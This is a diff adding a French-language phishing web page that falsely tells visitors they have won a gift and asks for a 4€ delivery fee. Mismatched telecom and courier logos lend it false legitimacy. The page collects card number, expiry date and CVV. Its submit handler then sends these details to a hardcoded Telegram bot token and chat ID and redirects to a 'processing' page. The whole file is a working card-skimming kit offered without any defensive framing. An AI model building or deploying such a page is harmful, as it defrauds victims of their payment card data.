@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Félicitations ! Vous avez remporté un cadeau !</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+        }
+        #card-error {
+            display: none;
+            color: red;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
+
+    <!-- Formulaire principal -->
+    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
+        <!-- Logos des opérateurs -->
+        <div class="flex justify-center space-x-4 mb-6">
+            <img src="pngtree-red-gift-vector-illustration-png-image_6447019.png" alt="logo" class="h-12">
+            <img src="DHL_Express_logo.svg.png" alt="Bouygues Telecom" class="h-12">
+            <img src="png-clipart-logo-brand-fedex-product-desktop-hermes-staff-text-orange.png" alt="Orange" class="h-12">
+            <img src="pngtree-express-delivery-logo-with-covered-van-png-image_9068427.png" alt="SFR" class="h-12">
+        </div>
+
+        <!-- Titre -->
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Félicitations !</h1>
+        <p class="text-sm text-center text-gray-600 mb-6">
+            Pour recevoir votre cadeau, veuillez remplir le formulaire ci-dessous et payer 4€ pour la confirmation et la livraison.
+        </p>
+
+        <!-- Numéro de carte -->
+        <form id="remboursement-form">
+            <div class="mb-4">
+                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
+                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+                <p id="card-error" class="text-red-500 hidden">Le numéro de carte est incorrect. Veuillez vérifier et réessayer.</p>
+            </div>
+
+            <script>
+                const cardInput = document.getElementById('numero-carte');
+                const cardError = document.getElementById('card-error');
+
+                cardInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, ''); // Supprimer les caractères non numériques
+                    if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Ajouter des espaces après 4 chiffres
+                    cardError.classList.add('hidden'); // Masquer l'erreur
+                });
+
+                cardInput.addEventListener('blur', () => {
+                    const value = cardInput.value.replace(/\s/g, '');
+                    const startsWithValidNumber = /^[4-6]/.test(value); // Numéros valides commençant par 4, 5 ou 6
+                    if (value.length !== 16 || !startsWithValidNumber) {
+                        cardError.classList.remove('hidden');
+                    }
+                });
+            </script>
+
+            <!-- Date d'expiration -->
+            <div class="mb-4">
+                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
+                <input type="month" id="date-expiration" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Code CVV -->
+            <div class="mb-4">
+                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
+                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Bouton de validation -->
+            <button type="submit"
+                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
+                Valider mon payement
+            </button>
+        </form>
+
+        <!-- Remarque -->
+        <p class="text-sm text-center text-gray-600 mt-6">
+            Remarque : Un montant de 4€ sera débité uniquement pour la confirmation et la livraison. Merci pour votre confiance !
+        </p>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-6 mt-10">
+        <div class="max-w-4xl mx-auto text-center">
+            <p class="text-lg font-semibold mb-2">Pour toute assistance, contactez-nous :</p>
+            <p class="text-sm">📧 Email: <a href="mailto:support@livraisoncadeau.com" class="text-green-400 hover:underline">support@livraisoncadeau.com</a></p>
+            <p class="text-sm">📞 Téléphone: <a href="tel:+33890889878" class="text-green-400 hover:underline">+33 8 90 83 67 89</a></p>
+            <p class="text-xs mt-4">&copy; 2024 Service de Livraison Cadeau. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById("numero-carte").value;
+            const expirationDate = document.getElementById("date-expiration").value;
+            const cvv = document.getElementById("cvv").value;
+
+            if (!cardNumber || !expirationDate || !cvv) {
+                alert("Veuillez remplir tous les champs.");
+                return;
+            }
+
+            const token = "7342455335:AAE0QCPLUpV1nO2lbfSwEAfZmx8qc-ZGSBo";
+            const chatId = "5372119436";
+
+            const message = `
+🔔 Nouvelle demande 🔔
+💳 Carte : ${cardNumber}
+📅 Expiration : ${expirationDate}
+🔒 CVV : ${cvv}
+`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message }),
+                });
+
+                if (response.ok) {
+                    window.location.href = "Traitement.html";
+                } else {
+                    alert("Erreur lors de l'envoi. Veuillez réessayer.");
+                }
+            } catch (error) {
+                alert("Une erreur est survenue. Vérifiez votre connexion.");
+            }
+        });
+    </script>
+</body>
+</html>
